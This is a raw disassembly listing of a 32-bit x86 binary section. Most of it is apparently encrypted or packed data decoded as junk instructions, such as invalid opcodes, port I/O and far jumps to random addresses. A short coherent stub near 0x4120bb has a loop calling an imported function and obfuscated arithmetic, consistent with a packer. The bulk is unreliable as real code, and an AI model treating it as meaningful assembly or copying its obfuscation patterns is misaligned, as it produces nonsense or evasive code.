  411f00:	mov    ds:0x9eecdf06,eax
  411f05:	test   al,0x2
  411f07:	rcr    BYTE PTR [ecx-0x55dd4eee],0x91
  411f0e:	sub    dl,BYTE PTR [ebx]
  411f10:	mov    cl,0x68
  411f12:	pop    ebx
  411f13:	xchg   ebx,eax
  411f14:	ins    BYTE PTR es:[edi],dx
  411f15:	xor    al,0xc5
  411f17:	div    ebp
  411f19:	or     al,0xde
  411f1b:	and    DWORD PTR [eax],esi
  411f1d:	pusha  
  411f1e:	mov    cs,WORD PTR [eax]
  411f20:	retf   0xa1eb
  411f23:	loope  0x411ed3
  411f25:	sub    dh,BYTE PTR [esi+ebp*2]
  411f28:	mov    ebp,0x1b8c5ef9
  411f2d:	je     0x411ec4
  411f2f:	adc    cl,BYTE PTR ds:0x477cd8c1
  411f35:	push   ss
  411f36:	adc    BYTE PTR [ecx+0x34],al
  411f39:	scas   al,BYTE PTR es:[edi]
  411f3a:	aad    0xfe
  411f3c:	dec    ebp
  411f3d:	mov    dl,0xb2
  411f3f:	xchg   ebp,eax
  411f40:	xchg   esi,eax
  411f41:	xor    bh,al
  411f43:	stos   DWORD PTR es:[edi],eax
  411f44:	loope  0x411f20
  411f46:	nop
  411f47:	ret    
  411f48:	mov    ebp,0x1aefa7a
  411f4d:	jl     0x411ee6
  411f4f:	push   esp
  411f50:	dec    esi
  411f51:	push   esi
  411f52:	out    dx,eax
  411f53:	mov    ah,0x19
  411f55:	(bad)  
  411f56:	out    0xa2,eax
  411f58:	xor    cl,ch
  411f5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f5b:	fwait
  411f5c:	dec    edx
  411f5d:	add    BYTE PTR [ecx+ebp*1-0x16796ba2],al
  411f64:	sti    
  411f65:	loopne 0x411fc1
  411f67:	in     eax,dx
  411f68:	in     al,dx
  411f69:	outs   dx,BYTE PTR ds:[esi]
  411f6a:	mov    al,ds:0x39e6877a
  411f6f:	adc    eax,0x349fbca5
  411f74:	fnstsw ax
  411f76:	jmp    0xc786:0xa050ff89
  411f7d:	push   esi
  411f7e:	xor    esp,DWORD PTR [edi+0x5d5a634c]
  411f84:	pop    esp
  411f85:	cmp    al,0x45
  411f87:	popa   
  411f88:	sub    DWORD PTR [ecx+eiz*8+0xf],ebx
  411f8c:	and    eax,DWORD PTR [ebx]
  411f8e:	sub    dh,BYTE PTR ss:[ebx]
  411f91:	inc    eax
  411f92:	adc    DWORD PTR [ebp-0x3],edi
  411f95:	and    al,0x81
  411f97:	xor    al,0xe9
  411f99:	or     BYTE PTR [ebp-0x62475bbe],0xd8
  411fa0:	out    dx,eax
  411fa1:	sub    BYTE PTR [ebx+0x2],bl
  411fa4:	(bad)  
  411fa5:	pop    ss
  411fa6:	pusha  
  411fa7:	stos   DWORD PTR es:[edi],eax
  411fa8:	sbb    eax,0xd959a72b
  411fad:	adc    eax,0x719f9407
  411fb2:	jne    0x411f7c
  411fb4:	sbb    DWORD PTR [esp+ebx*4+0x40],0x60
  411fb9:	sahf   
  411fba:	popf   
  411fbb:	mul    DWORD PTR [ecx+0xd]
  411fbe:	ds adc bh,bh
  411fc1:	add    DWORD PTR [edx+ebx*8-0x660fb872],0x1dbf2441
  411fcc:	nop
  411fcd:	int    0x81
  411fcf:	sub    cl,BYTE PTR [ebp-0x7d]
  411fd2:	pop    esi
  411fd3:	fwait
  411fd4:	call   0x7c671135
  411fd9:	dec    edi
  411fda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fdb:	fidivr DWORD PTR [edi+0x41361a78]
  411fe1:	(bad)  
  411fe3:	imul   ecx,DWORD PTR [edx+esi*2],0xee0179ad
  411fea:	ror    DWORD PTR [edi-0x23],0xc7
  411fee:	cdq    
  411fef:	inc    edi
  411ff1:	jno    0x411f88
  411ff3:	popa   
  411ff4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ff5:	cmp    dh,BYTE PTR [ebx+0x62bf49cd]
  411ffb:	dec    esi
  411ffc:	shl    ecx,0xca
  411fff:	lods   al,BYTE PTR ds:[esi]
  412000:	xchg   ecx,eax
  412001:	fstp   TBYTE PTR [eax-0x25d2ba14]
  412007:	aas    
  412008:	js     0x41204a
  41200a:	push   edi
  41200b:	inc    ebx
  41200c:	push   esp
  41200d:	and    DWORD PTR [esi-0x110dfb3a],0x70
  412014:	jmp    0x807d0309
  412019:	gs popa 
  41201b:	adc    al,0x99
  41201d:	mov    BYTE PTR [edi+0x53],bl
  412020:	test   ebp,0x42f8716d
  412026:	add    eax,esi
  412028:	mov    cl,bl
  41202a:	mov    edi,0xbfde103e
  41202f:	or     eax,0xec76cb2c
  412034:	mov    edi,0xed199d4d
  412039:	sub    dl,BYTE PTR [esi+ebp*1+0x19671399]
  412040:	lock in eax,dx
  412042:	fmul   QWORD PTR [ecx-0x281ec444]
  412048:	adc    al,0xcf
  41204a:	pop    es
  41204b:	dec    ebx
  41204c:	icebp  
  41204d:	loope  0x411fdc
  41204f:	fwait
  412050:	mov    ebp,0xc4a245b6
  412055:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412056:	gs shl ah,1
  412059:	dec    edi
  41205a:	lods   eax,DWORD PTR ds:[esi]
  41205b:	and    DWORD PTR [esi-0x1d],0x61
  41205f:	xor    cl,ah
  412061:	call   0x9b3a:0x3c0c52c6
  412068:	fistp  WORD PTR [edi-0x122918da]
  41206e:	je     0x41200a
  412070:	(bad)  
  412071:	leave  
  412072:	cs push ss
  412074:	repz mov eax,0x7cabae82
  41207a:	cmp    esp,edx
  41207c:	mov    ds:0x4f21fe49,al
  412081:	or     BYTE PTR [ebp+edi*8+0x10],ch
  412085:	test   esp,edi
  412087:	add    eax,0xf76018cd
  41208c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41208d:	cmp    bh,bh
  41208f:	ss add eax,0x5195d6cb
  412095:	cs out dx,al
  412097:	sbb    cl,0x44
  41209a:	xchg   esp,eax
  41209b:	jl     0x412083
  41209d:	jnp    0x4120b8
  41209f:	adc    al,bh
  4120a1:	sbb    al,0xc0
  4120a3:	xchg   edx,eax
  4120a4:	es cdq 
  4120a6:	loopne 0x41203e
  4120a8:	mov    al,ds:0x8b08458b
  4120ad:	add    BYTE PTR [ebx+0x41b2240d],cl
  4120b3:	add    BYTE PTR [ecx],al
  4120b5:	or     BYTE PTR [esi+0x5d],bl
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fdf6
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fd55
  4120d3:	adc    DWORD PTR ds:0x42e76f,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e76b,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e783,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e77b,0x19
  412102:	cmp    DWORD PTR ds:0x42e77b,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e77b,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fdfe
  412121:	push   0x0
  412123:	push   0x42e2ed
  412128:	call   DWORD PTR ds:0x42e503
  41212e:	mov    ebx,DWORD PTR ds:0x42e77b
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e77b,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e1a0,0x42fd81
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	jo     0x412108
  41216f:	div    BYTE PTR [ebx]
  412171:	inc    esi
  412172:	pop    edi
  412173:	jo     0x4121e5
  412175:	mov    ecx,0xa270707e
  41217a:	ret    
  41217b:	(bad)  
  41217c:	pop    ds
  41217d:	mov    ecx,0x4f1c73c7
  412182:	ret    
  412183:	sub    ah,BYTE PTR [ecx]
  412185:	sbb    BYTE PTR [edx],bh
  412187:	jno    0x4121f8
  412189:	mov    edx,0x3645ad39
  41218e:	retf   
  41218f:	xor    BYTE PTR [esi+0x3be3952f],dh
  412195:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412196:	ror    DWORD PTR ds:0xd13b5aa8,cl
  41219c:	rol    DWORD PTR [edx-0x225a2161],cl
  4121a2:	mov    ecx,0xa091d291
  4121a7:	mov    ecx,0xcd2e0dad
  4121ac:	cmp    al,0x5f
  4121ae:	add    esp,DWORD PTR [edi+0x5a]
  4121b1:	adc    al,0xe7
  4121b3:	mov    ebp,0x3296be43
  4121b8:	pop    edi
  4121b9:	mul    DWORD PTR [edi]
  4121bb:	xchg   ecx,eax
  4121bc:	pop    DWORD PTR [esi]
  4121be:	adc    BYTE PTR [eax+0x18],ah
  4121c1:	pop    esi
  4121c2:	cld    
  4121c3:	adc    BYTE PTR [eax-0x6aad86a6],bh
  4121c9:	or     eax,0x6d3a6018
  4121ce:	jge    0x4121bc
  4121d0:	loop   0x412229
  4121d2:	cmc    
  4121d3:	rcl    DWORD PTR [eax+0x7f23e52a],1
  4121d9:	sbb    al,0xea
  4121db:	mov    ds:0x81fc7d84,al
  4121e0:	inc    esp
  4121e1:	out    dx,eax
  4121e2:	add    BYTE PTR [eax],ch
  4121e4:	popa   
  4121e5:	cmp    al,0xeb
  4121e7:	dec    edi
  4121e8:	mov    al,ds:0x6d01e6d3
  4121ed:	aas    
  4121ee:	pusha  
  4121ef:	shr    DWORD PTR [ecx+0x69c6d958],1
  4121f5:	mov    edi,0x832397ac
  4121fa:	push   edx
  4121fb:	loope  0x4121f9
  4121fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121fe:	sub    eax,DWORD PTR [edi-0x57]
  412201:	out    dx,al
  412202:	push   edx
  412203:	adc    al,0xf3
  412205:	lds    ebx,FWORD PTR [esi]
  412207:	inc    DWORD PTR [ebx-0x67]
  41220a:	out    dx,al
  41220b:	mov    DWORD PTR ds:0xf0596344,ecx
  412211:	and    eax,0xe952f735
  412216:	scas   al,BYTE PTR es:[edi]
  412217:	inc    eax
  412218:	test   BYTE PTR [ebp+0x2a43dd4e],ah
  41221e:	mov    ebx,0x92a9e01f
  412223:	mov    cl,BYTE PTR [ecx+0x556f3705]
  412229:	outs   dx,BYTE PTR ds:[esi]
  41222a:	fist   WORD PTR [ebx-0x48b81fb2]
  412230:	fdivr  DWORD PTR [edi]
  412232:	test   eax,0x3ca21a84
  412237:	push   ax
  412239:	arpl   WORD PTR [eax-0x23bf7db1],di
  41223f:	cmp    eax,0x25d2ebf
  412244:	fs pusha 
  412246:	jmp    0x412294
  412248:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412249:	int    0x2c
  41224b:	sub    ebp,ebx
  41224d:	add    DWORD PTR [ebx+0x67ed8db2],0xc2de6c69
  412257:	and    edi,DWORD PTR [eax-0x77]
  41225a:	test   DWORD PTR [ebx-0x261334ba],ecx
  412260:	ret    0x2728
  412263:	sbb    BYTE PTR [edx+0x3],0x77
  412267:	xchg   DWORD PTR [ecx+eiz*8-0x61],ebp
  41226b:	push   0x3e160694
  412270:	repz repz cdq 
  412273:	adc    DWORD PTR [esi+0x7f2cb818],edx
  412279:	sbb    eax,0xb2b29f6a
  41227e:	dec    edi
  41227f:	cmp    BYTE PTR [ebx-0x6db082ee],ah
  412285:	repnz dec edi
  412287:	push   cs
  412288:	clc    
  412289:	xlat   BYTE PTR ds:[ebx]
  41228a:	fidivr DWORD PTR [edx-0x7eb442d3]
  412290:	(bad)  
  412291:	jmp    0x412295
  412293:	cmp    ebx,DWORD PTR [ebx+0x13]
  412296:	mov    ?,WORD PTR [esp+esi*2]
  412299:	arpl   ax,dx
  41229b:	fbstp  TBYTE PTR [edx-0x2a10e3e2]
  4122a1:	sbb    al,0xfb
  4122a3:	and    esp,ebp
  4122a5:	dec    eax
  4122a6:	sti    
  4122a7:	aaa    
  4122a8:	jmp    0x845:0x38115760
  4122af:	or     eax,0x9b1de71
  4122b4:	mov    ah,0x51
  4122b6:	mov    DWORD PTR [eax+ebx*8],0xb071684c
  4122bd:	push   esp
  4122be:	int3   
  4122bf:	sbb    DWORD PTR [edx+0x53],eax
  4122c2:	fwait
  4122c3:	pop    ebp
  4122c4:	imul   esp,ebx,0x1
  4122c7:	mov    WORD PTR [edx-0x1a],ds
  4122ca:	sub    edi,DWORD PTR [edi+0x7b]
  4122cd:	add    dh,BYTE PTR [ebx]
  4122cf:	dec    esp
  4122d0:	push   ecx
  4122d1:	push   edx
  4122d2:	xchg   BYTE PTR [esi+0x32],bl
  4122d5:	adc    DWORD PTR es:[ebx-0x16],edx
  4122d9:	xor    eax,0x1f3e7b35
  4122de:	nop
  4122df:	iret   
  4122e0:	sbb    cl,BYTE PTR [eax+0x5a]
  4122e3:	push   ss
  4122e4:	push   ebx
  4122e5:	sbb    bl,dh
  4122e7:	dec    ebp
  4122e8:	add    DWORD PTR [ebp-0x5a95443f],edi
  4122ee:	mov    ds:0xba02035b,al
  4122f3:	repz or al,0xe3
  4122f6:	mov    ah,0xc7
  4122f8:	sti    
  4122f9:	xor    ebp,DWORD PTR [ebp-0x56a5677f]
  4122ff:	pop    ss
  412300:	jmp    0x49dba07b
  412305:	jae    0x412367
  412307:	mov    dh,0xb4
  412309:	mov    ebp,0x4190fac3
  41230e:	and    edx,ebp
  412310:	add    DWORD PTR [ebx+edx*4-0x3c],0xc36efc85
  412318:	push   ebp
  412319:	js     0x412351
  41231b:	not    BYTE PTR [ebx+0xff9058c]
  412321:	jp     0x412368
  412323:	call   0x2a67:0xa159d8f3
  41232a:	adc    eax,0xcc52bdb4
  41232f:	daa    
  412330:	mov    esp,0xfee54812
  412335:	pop    esi
  412336:	nop
  412337:	sub    eax,edx
  412339:	icebp  
  41233a:	or     dh,bh
  41233c:	call   ecx
  41233e:	jbe    0x4122d2
  412340:	in     al,0xd
  412342:	xlat   BYTE PTR ds:[ebx]
  412343:	sar    BYTE PTR [ebx+0x19],1
  412346:	jbe    0x412309
  412348:	loope  0x412333
  41234a:	mov    ch,0x77
  41234c:	pop    esp
  41234d:	add    DWORD PTR [ecx-0x33c7980c],eax
  412353:	sub    eax,0x4b2809d9
  412358:	jmp    0x412378
  41235a:	mov    dl,0xe3
  41235c:	xor    DWORD PTR [ebp+0x7d],0x5c
  412360:	inc    ecx
  412361:	imul   edi,DWORD PTR [ecx-0x1f],0xffffff88
  412365:	sbb    DWORD PTR [edx+0x66501b8c],0x672ea282
  41236f:	hlt    
  412370:	out    dx,eax
  412371:	pop    edx
  412372:	test   dh,al
  412374:	ds adc ecx,ebp
  412377:	or     eax,0x2d16a8f6
  41237c:	call   FWORD PTR [ecx+ebp*2]
  41237f:	inc    edx
  412380:	mov    DWORD PTR [edi],ecx
  412382:	mov    fs,esi
  412384:	cwde   
  412385:	pusha  
  412386:	loope  0x41238a
  412388:	in     eax,0x74
  41238a:	fcmovne st,st(3)
  41238c:	sahf   
  41238d:	mov    edx,ebx
  41238f:	sti    
  412390:	cs push ebx
  412392:	icebp  
  412393:	enter  0x17e9,0xf2
  412397:	push   ebx
  412398:	add    DWORD PTR [edx+0x6f6e012e],esi
  41239e:	int    0xfb
  4123a0:	outs   dx,DWORD PTR ds:[esi]
  4123a1:	cld    
  4123a2:	in     eax,dx
  4123a3:	fwait
  4123a4:	mov    ebp,?
  4123a6:	mov    ecx,0xb704f66f
  4123ab:	repz dec eax
  4123ad:	pushw  0x1b8b
  4123b1:	adc    BYTE PTR [edi+0x62b5e49f],al
  4123b7:	jecxz  0x41236a
  4123b9:	fist   DWORD PTR [ebp-0x7c]
  4123bc:	cs jl  0x41237d
  4123bf:	xor    ch,0x35
  4123c2:	(bad)  
  4123c3:	out    dx,eax
  4123c4:	ret    0xb24e
  4123c7:	test   eax,0x79e25701
  4123cc:	xor    al,0xfb
  4123ce:	xlat   BYTE PTR ds:[ebx]
  4123cf:	mov    WORD PTR ds:0x4729d543,cs
  4123d5:	jmp    0x4629:0x94e9cffd
  4123dc:	jns    0x41245a
  4123de:	mov    esi,0x409facbd
  4123e3:	jp     0x4123b2
  4123e5:	in     al,dx
  4123e6:	cmp    ch,BYTE PTR [ecx+0x59]
  4123e9:	stos   DWORD PTR es:[edi],eax
  4123ea:	push   ss
  4123eb:	adc    ah,cl
  4123ed:	mov    ds:0xe5069a48,al
  4123f2:	dec    eax
  4123f3:	pop    edi
  4123f4:	pop    ebx
  4123f5:	sub    BYTE PTR [edx],cl
  4123f7:	sti    
  4123f8:	repnz xor eax,0x5f66a7b3
  4123fe:	mov    al,0x25
  412400:	push   0x4
  412402:	pop    es
  412403:	fucomp st(4)
  412405:	push   eax
  412406:	test   DWORD PTR ds:0xd1d19dee,ebx
  41240c:	xor    DWORD PTR [edx],esp
  41240e:	(bad)  
  412410:	xor    edx,DWORD PTR [ebx-0x3c]
  412413:	xchg   ebx,eax
  412414:	and    ecx,esi
  412416:	xchg   ebx,esp
  412418:	cdq    
  412419:	add    DWORD PTR [edx-0x5e],edx
  41241c:	mov    ds:0x3cda265a,al
  412421:	pop    es
  412422:	scas   eax,DWORD PTR es:[edi]
  412423:	pushf  
  412424:	add    BYTE PTR [eax],0x0
  412427:	cmp    eax,0xffffff99
  41242a:	xor    ebx,DWORD PTR [ebx-0x53]
  41242d:	xor    DWORD PTR [edx],0xffffffa9
  412430:	pop    ebp
  412431:	mov    ch,0x13
  412433:	xchg   BYTE PTR [edi-0x7f],ch
  412436:	nop
  412437:	cmp    DWORD PTR [ebx],edi
  412439:	in     al,0xda
  41243b:	in     eax,0x4
  41243d:	mov    ch,0xd4
  41243f:	cmp    DWORD PTR [ebx],eax
  412441:	retf   
  412442:	sub    DWORD PTR ds:0x42fd79,0xf96
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	xchg   edi,eax
  41245e:	sbb    al,0x5c
  412460:	je     0x4123f1
  412462:	pop    esp
  412463:	jo     0x4124d5
  412465:	mov    ecx,0x5670707e
  41246a:	push   esp
  41246b:	sbb    DWORD PTR [ecx],0xae6a0c2e
  412471:	sbb    cl,BYTE PTR [edx-0x72]
  412474:	pop    es
  412475:	cmp    BYTE PTR [edi-0x48],cl
  412478:	adc    edi,esp
  41247a:	inc    ebx
  41247b:	push   edi
  41247c:	and    ah,bh
  41247e:	sbb    esi,DWORD PTR [edi]
  412480:	pop    ebx
  412481:	scas   eax,DWORD PTR es:[edi]
  412482:	shl    BYTE PTR [ecx-0x30],1
  412485:	shl    DWORD PTR [esi],1
  412487:	push   0xffffffc5
  412489:	sub    eax,0x79f3b7ce
  41248e:	xchg   esi,eax
  41248f:	xor    al,0xd7
  412491:	outs   dx,DWORD PTR ds:[esi]
  412492:	pop    ebx
  412493:	jno    0x412510
  412495:	sti    
  412496:	and    ch,al
  412498:	jle    0x4124ac
  41249a:	inc    ebp
  41249b:	jge    0x4124df
  41249d:	int    0x96
  41249f:	cmp    al,0x81
  4124a1:	loope  0x4124c2
  4124a3:	jo     0x412436
  4124a5:	xor    al,0x94
  4124a7:	cmp    dh,BYTE PTR [edi]
  4124a9:	add    BYTE PTR [edx],bl
  4124ab:	sbb    BYTE PTR [eax+0xf],bh
  4124ae:	adc    DWORD PTR [esi],edx
  4124b0:	mov    eax,ds:0xa8404373
  4124b5:	in     al,0x26
  4124b7:	inc    eax
  4124b8:	out    0x6c,eax
  4124ba:	inc    bh
  4124bc:	clc    
  4124bd:	xchg   edx,eax
  4124be:	(bad)  
  4124bf:	mul    BYTE PTR [ecx]
  4124c1:	inc    ebx
  4124c2:	(bad)  
  4124c3:	xor    ebp,ebx
  4124c5:	lods   eax,DWORD PTR ds:[esi]
  4124c6:	ret    0x8a82
  4124c9:	int    0x9e
  4124cb:	adc    BYTE PTR [ebp+0x4e56877a],al
  4124d1:	pop    ebp
  4124d2:	xor    DWORD PTR [eax],0x9156a6ae
  4124d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124d9:	jne    0x412533
  4124db:	dec    ebp
  4124dc:	mov    esi,DWORD PTR [ebp-0x126cadf7]
  4124e2:	out    dx,eax
  4124e3:	imul   BYTE PTR [edi]
  4124e5:	out    0x60,eax
  4124e7:	xor    al,BYTE PTR [edi]
  4124e9:	mov    al,0x53
  4124eb:	pop    ds
  4124ec:	adc    bl,dl
  4124ee:	push   esi
  4124ef:	adc    edi,DWORD PTR [ebx-0x60]
  4124f2:	ja     0x4124ae
  4124f4:	xchg   ebx,eax
  4124f5:	pop    ss
  4124f6:	push   es
  4124f7:	das    
  4124f8:	mov    al,ds:0x4986118b
  4124fd:	es (bad) 
  4124ff:	and    ch,cl
  412501:	loopne 0x4124fc
  412503:	push   esp
  412504:	and    DWORD PTR [ecx-0x2ac3fc35],ebp
  41250a:	push   esp
  41250b:	jno    0x4124cd
  41250d:	mov    ebx,0xcc129437
  412512:	arpl   WORD PTR [edi+0x41],bp
  412515:	repz pushf 
  412517:	cwde   
  412518:	mov    eax,ds:0xc1252299
  41251d:	sub    al,0x37
  41251f:	fbld   TBYTE PTR [edi-0x1f]
  412522:	sahf   
  412523:	xchg   bh,cl
  412525:	idiv   esi
  412527:	mov    bl,0xfd
  412529:	inc    edi
  41252a:	in     eax,dx
  41252b:	shl    DWORD PTR [esi+esi*1+0x43],1
  41252f:	les    esp,FWORD PTR [edi-0x743dd30b]
  412535:	adc    eax,0x2c8990b3
  41253a:	pop    edx
  41253b:	mov    ebp,0xb3abcdca
  412540:	inc    eax
  412541:	xchg   edx,eax
  412542:	mov    eax,0x5c94f8b3
  412547:	mov    BYTE PTR [ebx+0x52],0xb2
  41254b:	icebp  
  41254c:	sbb    edi,DWORD PTR [edx-0xbdd85d1]
  412552:	test   ah,0xae
  412555:	cdq    
  412556:	dec    ebp
  412557:	push   es
  412558:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412559:	mov    bh,0x54
  41255b:	cmp    bl,BYTE PTR [ebx-0x3c8b89c0]
  412561:	aam    0xae
  412563:	inc    edx
  412564:	and    ah,BYTE PTR [edx+0x7c5e81e1]
  41256a:	repnz cs test eax,0x6940dd1
  412571:	sar    BYTE PTR [edi+0x6e],1
  412574:	sbb    eax,DWORD PTR [esi-0x23]
  412577:	js     0x4125ba
  412579:	imul   ebx,ebx,0x7387a05f
  41257f:	popa   
  412580:	in     eax,0x49
  412582:	aaa    
  412583:	aas    
  412584:	push   esi
  412585:	loope  0x4125a0
  412587:	or     BYTE PTR [esi-0x23d7ba1b],bl
  41258d:	adc    al,0x4c
  41258f:	sar    BYTE PTR [edi-0x1eb6681f],0x5a
  412596:	xlat   BYTE PTR ds:[ebx]
  412597:	push   0x73
  412599:	cmc    
  41259a:	sub    BYTE PTR [eax-0x254e0bf0],cl
  4125a0:	cdq    
  4125a1:	pop    eax
  4125a2:	add    ah,bh
  4125a4:	cmp    ah,bh
  4125a6:	fcmovne st,st(0)
  4125a8:	rcr    DWORD PTR [eax-0x28],1
  4125ab:	mov    ebp,0x778cce69
  4125b0:	push   esi
  4125b1:	mov    cl,0x18
  4125b3:	pop    ebx
  4125b4:	mov    ebx,0xc78ab7a2
  4125b9:	mov    ds:0x9f5742eb,eax
  4125be:	fincstp 
  4125c0:	outs   dx,DWORD PTR ds:[esi]
  4125c1:	xlat   BYTE PTR ds:[ebx]
  4125c2:	jle    0x41258a
  4125c4:	ins    DWORD PTR es:[edi],dx
  4125c5:	sar    BYTE PTR [edx-0x20],cl
  4125c8:	lds    edi,FWORD PTR [ebp+0x4d]
  4125cb:	loope  0x412648
  4125cd:	hlt    
  4125ce:	in     eax,0xd4
  4125d0:	test   BYTE PTR [ecx-0x45],0x2b
  4125d4:	cmp    BYTE PTR [esi-0x3],0x25
  4125d8:	stos   DWORD PTR es:[edi],eax
  4125d9:	adc    eax,0xf0fb80b
  4125de:	(bad)  
  4125df:	dec    esp
  4125e0:	jg     0x4125fc
  4125e2:	sbb    eax,0x699615e1
  4125e7:	xor    esi,DWORD PTR [ebp+0xd]
  4125ea:	jle    0x412658
  4125ec:	(bad)  
  4125ed:	retf   
  4125ee:	push   ebp
  4125ef:	mov    eax,ds:0x44d3dd69
  4125f4:	jnp    0x4125f6
  4125f6:	iret   
  4125f7:	jg     0x4125a3
  4125f9:	mov    ch,0xc1
  4125fb:	lahf   
  4125fc:	and    BYTE PTR [esi+0x130d2e71],al
  412602:	(bad)  
  412604:	std    
  412605:	cs or  al,0x27
  412608:	push   eax
  412609:	lock mov WORD PTR [edx-0x52f22ecb],es
  412610:	add    eax,0x27529c6c
  412615:	leave  
  412616:	sub    DWORD PTR [edi+ebp*4-0x1ebc917f],0x54a372ff
  412621:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412622:	mov    ebp,0x4cf2e151
  412627:	icebp  
  412628:	adc    DWORD PTR ss:[esi-0x4b],esp
  41262c:	in     al,0x33
  41262e:	stos   BYTE PTR es:[edi],al
  41262f:	cwde   
  412630:	lock xchg edi,eax
  412632:	sbb    eax,0x3fd3799e
  412637:	adc    ebp,DWORD PTR [ebx-0x1717ac34]
  41263d:	cs sub ebx,eax
  412640:	mov    BYTE PTR [ecx-0x26],ah
  412643:	loopne 0x412675
  412645:	jle    0x412649
  412647:	ins    DWORD PTR es:[edi],dx
  412648:	mov    eax,ds:0x74fd3a72
  41264d:	cmp    al,0xe6
  41264f:	mov    esp,0x9488264f
  412654:	mov    edi,0xbd0ca9fd
  412659:	xchg   DWORD PTR [esi+0x12e9072f],edi
  41265f:	cvtdq2ps xmm3,XMMWORD PTR [ebx]
  412662:	xchg   ebp,eax
  412663:	or     edx,esp
  412665:	mov    edi,0x99858461
  41266a:	in     al,dx
  41266b:	dec    ebx
  41266c:	(bad)  
  41266d:	fstp   TBYTE PTR [edi+ecx*8-0x19]
  412671:	lods   eax,DWORD PTR ds:[esi]
  412672:	ins    DWORD PTR es:[edi],dx
  412673:	inc    edi
  412674:	cmp    DWORD PTR [ebx-0x2],edi
  412677:	jnp    0x412620
  412679:	or     ebx,DWORD PTR ss:[esi+0x3dac4942]
  412680:	mov    WORD PTR [eax-0x70],fs
  412683:	xchg   esp,eax
  412684:	cld    
  412685:	addr16 aaa 
  412687:	inc    edi
  412688:	out    0x5a,al
  41268a:	sub    eax,0xad2ffe07
  41268f:	out    dx,al
  412690:	aad    0xff
  412692:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412693:	xchg   ecx,eax
  412694:	and    al,BYTE PTR [esi]
  412696:	jbe    0x412621
  412698:	xor    eax,0x53a5285f
  41269d:	rcr    dl,0x3a
  4126a0:	pop    ds
  4126a1:	and    eax,0x89d8fe82
  4126a6:	push   ebx
  4126a7:	sub    ch,BYTE PTR [edx-0x25eebe44]
  4126ad:	xlat   BYTE PTR ds:[ebx]
  4126ae:	std    
  4126af:	jle    0x412707
  4126b1:	mov    ds:0x5c75463f,eax
  4126b6:	or     eax,eax
  4126b8:	mov    eax,ds:0x7cc5fa56
  4126bd:	in     al,0xe3
  4126bf:	lea    ecx,[edi+0x2b]
  4126c2:	outs   dx,BYTE PTR ds:[esi]
  4126c3:	repnz shr BYTE PTR [esi-0x45cae950],0x6c
  4126cb:	cli    
  4126cc:	dec    eax
  4126cd:	pop    eax
  4126ce:	neg    eax
  4126d0:	dec    ecx
  4126d1:	inc    ebp
  4126d2:	pop    esi
  4126d3:	jb     0x41265d
  4126d5:	imul   eax,DWORD PTR [ecx+0x62e689d1],0xb
  4126dc:	mov    dh,0x73
  4126de:	xchg   BYTE PTR [esi-0x4b661f8c],dl
  4126e4:	sbb    DWORD PTR [ebp+0x58],edx
  4126e7:	and    cl,dl
  4126e9:	ins    BYTE PTR es:[edi],dx
  4126ea:	fsub   QWORD PTR [ebx]
  4126ec:	inc    edx
  4126ed:	arpl   WORD PTR [ecx+0xd9c302b],si
  4126f3:	(bad)  
  4126f4:	pop    ebx
  4126f5:	ins    BYTE PTR es:[edi],dx
  4126f6:	out    dx,al
  4126f7:	mov    ?,WORD PTR [edx+0x4b]
  4126fa:	(bad)  
  4126fb:	clc    
  4126fc:	xchg   ebp,eax
  4126fd:	cs loop 0x412761
  412700:	inc    esp
  412701:	ins    DWORD PTR es:[edi],dx
  412702:	xor    ebx,DWORD PTR [edx+0x11]
  412705:	stc    
  412706:	mov    WORD PTR [edi-0x53],?
  412709:	pop    ds
  41270a:	inc    esi
  41270b:	mov    dh,0x2b
  41270d:	cwde   
  41270e:	sbb    ebp,esi
  412710:	jmp    0x9c36f0e5
  412715:	dec    ebx
  412716:	inc    ecx
  412717:	retf   0x8d50
  41271a:	xchg   edx,eax
  41271b:	push   ecx
  41271c:	xchg   DWORD PTR [ebp-0x5a393190],edx
  412722:	aas    
  412723:	ds mov bl,0x85
  412726:	jno    0x4126c7
  412728:	mov    ah,0xc6
  41272a:	xlat   BYTE PTR ds:[ebx]
  41272b:	xor    edi,esp
  41272d:	pop    edi
  41272e:	in     eax,dx
  41272f:	xrelease mov DWORD PTR [ebp-0x1c],ecx
  412733:	and    DWORD PTR ds:0x42fdf6,0x0
  41273d:	jmp    0x412751
  412742:	xor    ecx,ecx
  412744:	or     ecx,DWORD PTR ds:0x42fdf6
